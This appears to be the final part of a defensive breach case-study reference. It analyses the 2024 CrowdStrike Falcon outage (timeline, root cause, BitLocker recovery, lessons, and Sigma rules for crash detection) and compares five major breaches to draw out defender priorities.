| 2024-07-19 04:09 onwards | Windows hosts begin experiencing BSOD (bug check 0x50 — PAGE_FAULT_IN_NONPAGED_AREA) in csagent.sys | Impact |
| 2024-07-19 ~04:30 | Initial reports emerge on social media and IT forums | Detection (External) |
| 2024-07-19 05:27 | CrowdStrike reverts the faulty channel file update | Containment |
| 2024-07-19 05:30 | Hosts that boot after 05:27 UTC receive corrected channel file and do not crash | Partial Mitigation |
| 2024-07-19 ~06:00 | Airlines begin grounding flights (Delta, United, American); airports display BSOD on departure screens | Cascading Impact |
| 2024-07-19 ~06:00 | Hospitals revert to paper records; 911 systems impacted in multiple US states | Critical Impact |
| 2024-07-19 ~07:00 | CrowdStrike CEO George Kurtz confirms issue; states "not a security incident or cyberattack" | Public Acknowledgment |
| 2024-07-19 ~08:00 | CrowdStrike publishes manual remediation steps (boot to Safe Mode, delete channel file) | Remediation |
| 2024-07-19 08:00–ongoing | IT teams worldwide begin manual remediation of millions of devices | Recovery |
| 2024-07-19 12:00 | Microsoft estimates 8.5 million Windows devices affected (<1% of Windows install base) | Scope |
| 2024-07-19–25 | Mass manual remediation continues; some orgs require physical access to BitLocker-encrypted machines | Extended Recovery |
| 2024-07-22 | CrowdStrike publishes Preliminary Post Incident Review | Post-Incident |
| 2024-07-24 | CrowdStrike CEO testifies before US Congress | Regulatory |
| 2024-08-06 | CrowdStrike publishes Root Cause Analysis (RCA) | Post-Incident |

### Technical Root Cause

```
CHANNEL FILE MECHANISM:
├── Falcon sensor uses "Channel Files" for rapid threat detection updates
├── Channel Files are NOT full sensor updates — they are config/pattern files
├── Channel File 291 (C-00000291*.sys) — named pipe detection logic
├── Deployed via "Rapid Response Content" — bypasses standard staged rollout
└── Runs in kernel space as part of csagent.sys driver

ROOT CAUSE CHAIN:
├── 1. Template Type definition introduced new IPC (InterProcessCommunication) fields
├── 2. Template Type expected 21 input fields
├── 3. Channel File 291 update provided only 20 input fields
├── 4. Content Interpreter attempted to access 21st field → out-of-bounds memory read
├── 5. Kernel-mode out-of-bounds read → bug check 0x50 (PAGE_FAULT_IN_NONPAGED_AREA)
├── 6. Windows kernel panics → Blue Screen of Death
└── 7. On reboot, csagent.sys loads before user can intervene → boot loop

WHY SAFE MODE FIXED IT:
├── Safe Mode does not load third-party kernel drivers
├── csagent.sys does not load → system boots successfully
├── Admin can navigate to:
│   C:\Windows\System32\drivers\CrowdStrike\
├── Delete file matching: C-00000291*.sys
└── Reboot → sensor loads, downloads corrected channel file
```

### BitLocker Complication

```
RECOVERY CHALLENGE:
├── Many enterprise devices use BitLocker full-disk encryption
├── Safe Mode boot requires BitLocker recovery key
├── BitLocker recovery keys stored in:
│   ├── Active Directory (if domain-joined)
│   ├── Azure AD / Entra ID
│   ├── SCCM / Intune
│   └── Printed/saved recovery keys
├── PROBLEM: if AD or Entra ID servers are ALSO crashed by CrowdStrike...
│   └── Chicken-and-egg: need recovery key to fix server, need server to get recovery key
└── LESSON: BitLocker recovery key escrow must be in a separate, resilient system

REMEDIATION AT SCALE:
├── Manual: IT staff physically at each machine → Safe Mode → delete file → reboot
├── Semi-automated: PXE boot with WinPE → scripted remediation
├── Cloud-managed: Intune remediation scripts (for devices that could still reach cloud)
├── CrowdStrike provided USB boot remediation tool
└── Estimated remediation time: weeks for large enterprises (millions of endpoints)
```

### Impact Analysis by Sector

| Sector | Impact | Recovery Time |
|--------|--------|--------------|
| Aviation | Delta canceled >5,000 flights; estimated $500M loss; other airlines grounded for hours | Hours to days |
| Healthcare | Hospitals reverted to paper; surgeries postponed; 911 systems degraded | Hours to days |
| Financial Services | Banks, trading floors, ATMs offline; transactions delayed | Hours |
| Retail/Hospitality | POS systems down; Starbucks, McDonald's impacted | Hours |
| Government/Emergency | 911 dispatch systems impacted in AZ, AK, NH, OH; government agencies offline | Hours to days |
| Broadcasting | Sky News off air; other broadcasters showed BSOD on live TV | Hours |
| Transportation | Rail, shipping, logistics systems disrupted | Hours to days |

### Availability Lessons (Not a Traditional ATT&CK Mapping)

| Category | Failure | Lesson |
|----------|---------|--------|
| Software QA | Channel file with field count mismatch not caught | Content validation must verify field count matches template type definition |
| Testing | Rapid Response Content bypassed staged rollout | ALL kernel-mode content must go through canary → staged → full deployment |
| Blast Radius | 100% of Windows sensors received update within 78 minutes | Phased rollout: 1% → 5% → 25% → 100% with automated health checks at each stage |
| Kernel Privilege | Content interpreter runs in kernel mode | Minimize kernel-mode code; move content interpretation to user-mode where possible |
| Recovery | BSOD boot loop required physical intervention | Implement sensor self-healing: if crash detected on boot, skip newest content update automatically |
| Dependency | Single EDR vendor across entire fleet | Avoid monoculture; consider diverse tooling for critical infrastructure segments |
| BitLocker | Recovery keys inaccessible when AD servers also crashed | BitLocker recovery key escrow in independent, resilient storage (not dependent on the same infrastructure) |
| Communication | 78-minute exposure window before revert | Automated deployment health monitoring: if crash rate exceeds threshold (e.g., 0.1%), auto-revert within minutes |

### What Organizations Should Implement

```
VENDOR UPDATE CONTROLS:
├── 1. Staged update rings (even for "rapid response" content)
│   ├── Ring 0: Lab/test (1 hour bake)
│   ├── Ring 1: Canary (1% production, 4 hour bake)
│   ├── Ring 2: Early adopter (10%, 8 hour bake)
│   └── Ring 3: General availability (remaining fleet)
├── 2. N-1 update policy: never deploy the latest update; wait for validation
├── 3. Update delay configuration in Falcon sensor policy
│   └── Falcon sensor policy → Sensor Update → "Production -1" channel
├── 4. Automated rollback triggers based on endpoint health metrics
└── 5. Contractual SLAs with security vendors for update quality

BITLOCKER RESILIENCE:
├── 1. Escrow BitLocker recovery keys to MULTIPLE locations
│   ├── Active Directory (primary)
│   ├── Azure AD / Entra ID (secondary)
│   └── Offline database / HSM (tertiary, for disaster scenarios)
├── 2. Ensure key escrow infrastructure is NOT dependent on same EDR vendor
├── 3. Test recovery key retrieval quarterly
├── 4. Maintain PXE boot remediation capability for mass incidents
└── 5. Physical USB remediation boot drives pre-staged at major offices

RESILIENCE ARCHITECTURE:
├── 1. Avoid monoculture: critical infrastructure segments should not share single failure points
├── 2. Maintain manual operational capability (paper processes, analog backups)
├── 3. Test "mass endpoint failure" scenario in tabletop exercises
├── 4. Define vendor concentration risk in enterprise risk register
└── 5. Insurance: confirm cyber insurance covers vendor-caused outages (many policies exclude)
```

### Detection / Monitoring (Availability Focus)

| Metric | Source | Threshold | Action |
|--------|--------|-----------|--------|
| Endpoint crash rate | EDR console, SIEM | >0.1% of fleet in 15-minute window | Halt all pending updates; investigate |
| BSOD event spike | Windows Event Log (1001), crash dump collection | >10 BSOD events/hour fleet-wide (above baseline) | Alert SOC; correlate with recent changes |
| Endpoint check-in dropout | EDR console heartbeat | >1% of endpoints fail to check in within expected window | Investigate; correlate with update deployments |
| Service availability | APM, synthetic monitoring | Any Tier-1 service degradation coinciding with security update | Immediate triage; correlate with vendor update timeline |

### Sigma Rule — Mass BSOD Detection (Endpoint Crash Spike)

```yaml
title: Mass Windows BSOD Event Indicating Faulty Driver or Update
id: 4a7c9e21-3f8b-4d15-a6e2-7b0c1d5f8a39
status: experimental
description: Detects a spike in Windows bug check (BSOD) events across multiple endpoints, potentially indicating a faulty kernel-mode driver update as seen in the CrowdStrike Falcon incident
logsource:
  category: system
  product: windows
detection:
  selection:
    EventID: 1001
    Provider_Name: 'Microsoft-Windows-WER-SystemErrorReporting'
  condition: selection | count() by Computer > 1
  timeframe: 1h
falsepositives:
  - Hardware failures causing isolated BSODs
  - Windows Update applying kernel-mode driver updates
level: high
tags:
  - attack.impact
  - attack.t1499.004
```

### Sigma Rule — CrowdStrike Channel File Anomaly

```yaml
title: CrowdStrike Channel File Modification Outside Normal Update Window
id: 7e3f1b49-8c2d-4a76-b5f1-2d9e0c8a3b67
status: experimental
description: Detects modifications to CrowdStrike Channel Files in the driver directory that may indicate a faulty update deployment or tampering
logsource:
  category: file_change
  product: windows
detection:
  selection:
    TargetFilename|startswith: 'C:\Windows\System32\drivers\CrowdStrike\C-'
    TargetFilename|endswith: '.sys'
  filter_expected:
    User|contains: 'SYSTEM'
  condition: selection
falsepositives:
  - Normal CrowdStrike Rapid Response Content updates (high volume; use as baseline, alert on anomalous patterns)
level: medium
tags:
  - attack.impact
  - attack.t1499
```

---

## Cross-Breach Analysis Matrix (Part 2)

### Initial Access Comparison

| Breach | Initial Vector | MFA Present | Time to Detection | Attacker Dwell |
|--------|---------------|-------------|-------------------|----------------|
| Colonial Pipeline | Compromised VPN credential | No | ~8 days | 8 days |
| Okta (2023) | Stolen employee credential | Yes (bypassed via support system) | 19 days (external) | 19 days |
| Kaseya VSA | Auth bypass vulnerability (CVE-2021-30116) | N/A (vuln bypass) | ~2 hours (external via Sophos/Huntress) | <2 hours |
| MGM Resorts | Help desk social engineering | Yes (socially bypassed) | ~4 days | 4 days |
| Change Healthcare | Compromised Citrix credential | No | ~9 days | 9 days |
| CrowdStrike Falcon | Faulty software update (not attack) | N/A | ~1.5 hours (user reports) | N/A |

### Recurring Failure Patterns

| Pattern | Occurrences | Breaches |
|---------|------------|----------|
| No MFA on remote access | 3/5 attacks | Colonial Pipeline, Change Healthcare, (MGM — MFA socially bypassed) |
| Credential compromise as initial vector | 4/5 attacks | Colonial Pipeline, Okta, MGM, Change Healthcare |
| Data exfiltrated before ransomware | 3/5 attacks | Colonial Pipeline, MGM, Change Healthcare |
| External party detected before victim | 3/5 attacks | Okta (BeyondTrust), Kaseya (Sophos/Huntress), CrowdStrike (user reports) |
| Ransom paid with limited benefit | 2/5 attacks | Colonial Pipeline (decryptor too slow), Change Healthcare (data leaked anyway) |
| Supply chain / concentration risk | 3/6 incidents | Okta (IdP cascade), Kaseya (MSP cascade), CrowdStrike (fleet-wide crash) |

### ATT&CK Technique Frequency (Part 2)

| Technique | ID | Breach Count | Breaches |
|-----------|----|-------------|----------|
| Valid Accounts | T1078 | 4 | Colonial Pipeline, Okta, MGM, Change Healthcare |
| Data Encrypted for Impact | T1486 | 4 | Colonial Pipeline, Kaseya, MGM, Change Healthcare |
| Exfiltration Over Web Service | T1567 | 3 | MGM, Change Healthcare, (Colonial — generic exfil) |
| Remote Services | T1021 | 3 | Colonial Pipeline, MGM, Change Healthcare |
| Impair Defenses | T1562 | 1 | Kaseya |
| Exploit Public-Facing Application | T1190 | 1 | Kaseya |
| Voice Phishing | T1566.004 | 1 | MGM |
| Steal Web Session Cookie | T1539 | 1 | Okta |

### Key Takeaways for Defenders

```
PRIORITY CONTROLS (would have prevented or significantly limited all 5 attacks):

1. MFA EVERYWHERE, NO EXCEPTIONS
   - Prevents: Colonial Pipeline, Change Healthcare
   - Limits: Okta (if support system had stricter auth), MGM (if help desk couldn't reset MFA)
   - Implementation: FIDO2/WebAuthn for admin accounts; TOTP minimum for all remote access
   - CIS Control 6.3, 6.4, 6.5

2. NETWORK SEGMENTATION AND EGRESS MONITORING
   - Prevents exfiltration in: Colonial Pipeline, MGM, Change Healthcare
   - Implementation: microsegmentation, DLP, netflow baseline, cloud access security broker
   - CIS Control 12.2, 12.6, 13.3, 13.4

3. IDENTITY SECURITY AS TIER-0
   - Prevents cascade in: Okta, MGM
   - Implementation: separate admin accounts, FIDO2 for IdP admin, continuous identity monitoring
   - Phishing-resistant MFA for ALL admin operations

4. HELP DESK IDENTITY VERIFICATION
   - Prevents: MGM (directly)
   - Implementation: callback verification, manager approval for MFA reset, video KYC for privileged accounts
   - Train help desk staff on social engineering by native speakers

5. VENDOR/SUPPLY CHAIN RISK MANAGEMENT
   - Limits impact: Kaseya, Okta, CrowdStrike
   - Implementation: staged update rings, vendor concentration risk assessment, contractual security requirements
   - Monitor exposed management interfaces (Shodan/Censys)

6. IMMUTABLE, TESTED BACKUPS
   - Reduces ransom dependency: all ransomware cases
   - Implementation: 3-2-1-1 rule (3 copies, 2 media types, 1 offsite, 1 immutable)
   - Test restoration quarterly; measure RTO against business requirements
```

---

*End of breach case studies reference (Parts 1 and 2). Each case study is designed for use in threat modeling, detection engineering, incident response planning, and security architecture review. Cross-reference with ATT&CK Navigator for coverage visualization.*
